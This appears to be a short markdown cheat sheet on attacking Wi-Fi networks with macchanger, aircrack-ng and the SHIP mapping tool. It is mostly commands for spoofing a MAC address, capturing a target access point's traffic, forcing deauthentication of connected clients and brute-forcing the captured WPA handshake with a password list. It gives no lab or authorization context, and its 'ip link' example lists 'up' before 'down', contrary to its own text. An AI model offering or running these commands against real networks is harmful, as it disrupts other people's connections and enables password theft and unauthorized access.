## Wireless

For a simple attack change the mac address of the wireless interface, scan
the access points of this interface.

### Macchanger

Before macchanger can do anything the interface has to be taken down. After
changing the mac address it has to be taken up.

```
$ ip link set dev interface up
$ ip link set dev interface down
```

#### Installation

```
$ sudo pacman -S macchanger
``` 

#### Usage

```
$ macchanger -r interface //change to random mac address
$ macchanger --mac=XX:XX:XX:XX:XX:XX interface //choose specific
$ macchanger -p interface //change back to permanent hardware mac
```

### Aircrack-ng

#### Installation

```
$ sudo pacman -S aircrack-ng
$ sudo pacman -S aircrack-ng-scripts
```

#### Usage

```
$ sudo airmon-ng start interface //put interface into monitor mode (mon0)
$ airodump-ng mon0 //list access point (AP) info
$ airodump-ng -c yy --bssid xx:xx:xx:xx:xx:xx -w dump_file mon0 //yy chanel, xx:xx... mac
//if successfull it will list bssid and station
$ aireplay-ng -0 2 -a BB:BB:BB:BB:BB:BB -c AA:AA:AA:AA:AA:AA mon0 //force deauth
//BB number BSSID, AA number STATION, -0 deauth attack, 2 n-try
$ aircrack-ng dump_file -w password.dict //brute force handshake
$ airmon-ng stop wlan0mon //return to managed mode
```

### SHIP

Ship is a tool to collect and map some data about address and ports

#### Installation

```
$ pacman -S gawk grep iproute2 mtr iputils sed traceroute wget
$ git clone https://github.com/xtonousou/ship.git
```

#### Usage

```
$ ship.sh //start program (or create symlink)
$ ship -i //show interfaces
```

There are many other options like `-g` for gateway, `-4|-6` for ipv4/ipv6, `-H` for host, `-HM` for host and mac address, `-e <url>` for the ip of an url, `-c <ip>` to calculate from an IP, or to do port listening `-p <port number>`.
